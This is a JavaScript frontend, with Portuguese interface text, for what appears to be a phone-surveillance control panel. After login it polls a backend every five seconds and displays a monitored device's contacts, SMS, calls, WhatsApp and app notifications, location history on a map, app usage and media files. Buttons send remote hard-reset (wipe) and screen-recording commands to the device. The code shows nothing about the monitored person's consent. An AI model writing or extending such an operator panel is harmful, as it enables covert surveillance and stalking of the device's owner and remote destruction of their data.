// main.js - frontend logic
const api = {
  post: async (path, body, token) => {
    const res = await fetch(path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json().catch(()=>({}));
  },
  get: async (path, token) => {
    const res = await fetch(path, { headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) } });
    if (!res.ok) return [];
    return res.json().catch(()=>[]);
  }
};

const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';
function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('userBox').classList.remove('hidden');
  document.getElementById('userName').innerText = user.username;
  showPanel('devices'); // default
  refreshAll();
}
function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}
function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

// login/register wiring
document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/api/auth/login', { username: u, password: p });
  if (r.token) setLoggedIn(r.user, r.token);
  else document.getElementById('loginMsg').innerText = r.error || 'Login failed';
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/api/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = (r.ok ? 'Registered. Login.' : (r.error||'Register failed'));
});
document.getElementById('btnLogout').addEventListener('click', logout);

// menu
document.querySelectorAll('.menu-btn').forEach(b=> b.addEventListener('click', () => {
  const t = b.getAttribute('data-target');
  showPanel(t);
}));

function hideAllPanels() {
  document.querySelectorAll('.panel').forEach(p=> p.classList.add('hidden'));
}
function showPanel(name) {
  hideAllPanels();
  const mapId = {
    contacts: 'contactsPanel',
    sms: 'smsPanel',
    calls: 'callsPanel',
    notifs: 'notifsPanel',
    location: 'locationPanel',
    usage: 'usagePanel',
    media: 'mediaPanel',
    devices: 'devicesPanel'
  }[name];
  if (mapId) document.getElementById(mapId).classList.remove('hidden');
}

// RENDER FUNCTIONS
async function renderContacts() {
  const token = getToken();
  const q = document.getElementById('contactsQuery').value || '';
  const data = await api.get('/api/contacts?q=' + encodeURIComponent(q) + '&limit=200', token);
  const ul = document.getElementById('contactsList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhum contacto</li>'; return; }
  data.forEach(c => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(c.name||'(sem nome)')}</strong><div style="color:#666">${escapeHtml(c.number||'')}</div></div>`;
    ul.appendChild(li);
  });
}
document.getElementById('btnSearchContacts').addEventListener('click', renderContacts);

async function renderSms() {
  const token = getToken();
  const data = await api.get('/api/sms', token);
  const ul = document.getElementById('smsList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhum SMS</li>'; return; }
  data.forEach(s => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(s.sender||'')}</strong>: ${escapeHtml(s.message||'')}</div><div style="color:#666">${new Date(s.timestamp||Date.now()).toLocaleString()}</div>`;
    ul.appendChild(li);
  });
}

async function renderCalls() {
  const token = getToken();
  const data = await api.get('/api/call', token);
  const ul = document.getElementById('callsList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhuma chamada</li>'; return; }
  data.forEach(c => {
    const li = document.createElement('li');
    const num = c.number || '(unknown)';
    const dur = c.duration ? Math.round(c.duration/1000)+'s' : '-';
    li.innerHTML = `<div><strong>${escapeHtml(num)}</strong><div style="color:#666">${escapeHtml(c.state||'')} • ${dur}</div></div><div style="color:#666">${new Date(c.timestamp||Date.now()).toLocaleString()}</div>`;
    ul.appendChild(li);
  });
}

async function renderNotifs() {
  const token = getToken();
  const data = await api.get('/api/whatsapp', token);
  const ul = document.getElementById('notifList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhuma notificação</li>'; return; }
  data.forEach(n => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(n.packageName||'')}</strong>: ${escapeHtml(n.message||'')}</div><div style="color:#666">${new Date(n.timestamp||Date.now()).toLocaleString()}</div>`;
    ul.appendChild(li);
  });
}

async function renderUsage() {
  const token = getToken();
  const data = await api.get('/api/app-usage', token);
  const ul = document.getElementById('usageList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhum uso</li>'; return; }
  data.forEach(u => {
    const li = document.createElement('li');
    li.innerHTML = `<div>${escapeHtml(u.packageName||'')} <div style="color:#666">${u.totalTime||0}ms</div></div>`;
    ul.appendChild(li);
  });
}

async function renderMedia() {
  const token = getToken();
  const data = await api.get('/api/media', token);
  const ul = document.getElementById('mediaList'); ul.innerHTML = '';
  if (!data || data.length===0) { ul.innerHTML = '<li>Nenhuma media</li>'; return; }
  data.forEach(m => {
    const li = document.createElement('li');
    const dl = document.createElement('button'); dl.textContent='Download'; dl.onclick = async () => {
      const token = getToken();
      const res = await fetch('/api/media/' + m._id, { headers: { Authorization: 'Bearer ' + token } });
      if (!res.ok) return alert('Download failed');
      const blob = await res.blob();
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = m.filename || m._id; document.body.appendChild(a); a.click(); a.remove();
    };
    li.innerHTML = `<div><strong>${escapeHtml(m.filename||m._id)}</strong><div style="color:#666">${m.metadata ? JSON.stringify(m.metadata) : ''}</div></div>`;
    li.appendChild(dl);
    ul.appendChild(li);
  });
}

async function renderDevices() {
  const token = getToken();
  const data = await api.get('/api/devices', token);
  const div = document.getElementById('devicesList'); div.innerHTML = '';
  if (!data || data.length===0) { div.innerHTML = 'Nenhum dispositivo'; return; }
  data.forEach(d => {
    const el = document.createElement('div');
    el.style.display='flex'; el.style.justifyContent='space-between'; el.style.padding='6px 0'; el.style.borderBottom='1px solid #eee';
    const left = document.createElement('div');
    left.innerHTML = `<strong>${escapeHtml(d.label||d.deviceId)}</strong><div style="color:#666">${d.lastSeen?new Date(d.lastSeen).toLocaleString():'never'}</div>`;
    const right = document.createElement('div');
    const dot = document.createElement('span'); dot.textContent='●'; dot.style.color = (d.lastSeen && (Date.now() - new Date(d.lastSeen).getTime()) < 120000) ? 'green' : 'red';
    right.appendChild(dot);
    const hr = document.createElement('button'); hr.textContent='Hard Reset'; hr.onclick = async () => {
      if (!confirm('Confirm hard reset?')) return;
      const token = getToken();
      const res = await api.post('/api/device/' + encodeURIComponent(d.deviceId) + '/command', { command: 'HARD_RESET' }, token);
      alert(res && res.ok ? 'Sent' : 'Failed');
    };
    right.appendChild(hr);
    const startSR = document.createElement('button'); startSR.textContent='Start ScreenRec'; startSR.onclick = async () => {
      const token = getToken();
      const res = await api.post('/api/device/' + encodeURIComponent(d.deviceId) + '/command', { command: 'START_SCREEN_RECORD' }, token);
      alert(res && res.ok ? 'Sent' : 'Failed');
    };
    right.appendChild(startSR);
    el.appendChild(left); el.appendChild(right);
    div.appendChild(el);
  });
}

// MAP (Leaflet) - history + realtime polling
let map, markersLayer;
function initMap() {
  if (map) return;
  map = L.map('map').setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
  markersLayer = L.layerGroup().addTo(map);
}
async function renderMap() {
  initMap();
  const token = getToken();
  const deviceId = document.getElementById('mapDeviceId').value || undefined;
  const query = deviceId ? ('?deviceId=' + encodeURIComponent(deviceId)) : '';
  const data = await api.get('/api/location' + query, token);
  markersLayer.clearLayers();
  if (!data || data.length===0) return;
  data.forEach((pt, idx) => {
    if (!pt.lat || !pt.lon) return;
    const marker = L.marker([pt.lat, pt.lon]).bindPopup(`${pt.deviceId || ''}<br>${new Date(pt.timestamp||pt.createdAt||Date.now()).toLocaleString()}`);
    markersLayer.addLayer(marker);
  });
  const first = data.find(d=>d.lat && d.lon);
  if (first) map.setView([first.lat, first.lon], 12);
}

// refresh all panels
async function refreshAll() {
  await Promise.all([
    renderContacts(), renderSms(), renderCalls(), renderNotifs(),
    renderUsage(), renderMedia(), renderDevices(), renderMap()
  ]);
}

// auto-refresh loop (5s)
setInterval(() => {
  if (getToken()) refreshAll();
}, 5000);

document.getElementById('btnReloadMap').addEventListener('click', renderMap);

// init on load if logged in
window.addEventListener('load', () => {
  const token = getToken();
  if (token) {
    const user = getUser();
    document.getElementById('loginBox').classList.add('hidden');
    document.getElementById('userBox').classList.remove('hidden');
    document.getElementById('userName').innerText = user ? user.username : '';
    refreshAll();
  }
});

function escapeHtml(s) {
  if (!s) return '';
  return s.toString().replace(/[&<>"']/g, (m)=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
    }
